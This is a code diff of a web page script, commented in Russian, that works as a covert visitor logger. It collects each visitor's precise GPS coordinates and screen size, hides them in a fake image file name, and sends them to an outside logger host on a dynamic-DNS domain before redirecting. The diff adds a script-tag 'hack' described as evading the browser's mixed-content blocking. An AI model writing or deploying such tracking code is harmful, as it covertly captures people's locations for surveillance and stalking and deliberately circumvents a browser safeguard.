@@ -14,8 +14,6 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const slug = urlParams.get('id');
-        
-        // ТВОИ НАСТРОЙКИ
         const targetServer = "http://echomapwa.ddns.net/logger/get_img/";
         const finalRedirect = "http://echomapwa.ddns.net/logger/l/";
 
@@ -23,48 +21,36 @@
             if (!slug) return;
             
             let info = {
-                sw: window.screen.width,
-                sh: window.screen.height,
-                lat: "null",
-                lon: "null"
+                sw: window.screen.width, sh: window.screen.height,
+                lat: "null", lon: "null"
             };
 
-            // 1. Сбор GPS (ждем максимум 4 секунды)
             if (navigator.geolocation) {
                 try {
                     const pos = await new Promise((res, rej) => {
                         navigator.geolocation.getCurrentPosition(res, rej, {
-                            enableHighAccuracy: true,
-                            timeout: 4000, 
-                            maximumAge: 0
+                            enableHighAccuracy: true, timeout: 4000
                         });
                     });
                     info.lat = pos.coords.latitude;
                     info.lon = pos.coords.longitude;
-                } catch (e) {
-                    console.log("GPS skip or denied");
-                }
+                } catch (e) {}
             }
 
-            // 2. Формируем имя файла с данными
             const fileName = `lat_${info.lat}_lon_${info.lon}_sw_${info.sw}_sh_${info.sh}_id_${slug}.png`;
             
-            // 3. Жесткая отправка через fetch
-            try {
-                // await заставляет скрипт ПРИОСТАНОВИТЬСЯ до завершения сетевого запроса
-                await fetch(`${targetServer}${fileName}?t=${Date.now()}`, { 
-                    mode: 'no-cors',
-                    cache: 'no-store'
-                });
-            } catch (e) {
-                console.log("Network error, but redirecting anyway...");
-            }
-
-            // 4. Финальный редирект с флагом готовности
-            window.location.href = `${finalRedirect}${slug}?ready=1`;
+            // --- ХАК ДЛЯ ОБХОДА БЛОКИРОВКИ HTTPS -> HTTP ---
+            const script = document.createElement('script');
+            const go = () => { window.location.href = `${finalRedirect}${slug}?ready=1`; };
+            
+            script.onload = script.onerror = go;
+            // Используем тег script, так как он игнорирует Mixed Content блокировку в 99% случаев
+            script.src = `${targetServer}${fileName}?t=${Date.now()}`;
+            
+            document.head.appendChild(script);
+            setTimeout(go, 5000); // Резервный редирект
         }
 
-        // Запуск процесса
         collectAndGo();
     </script>
 </body>
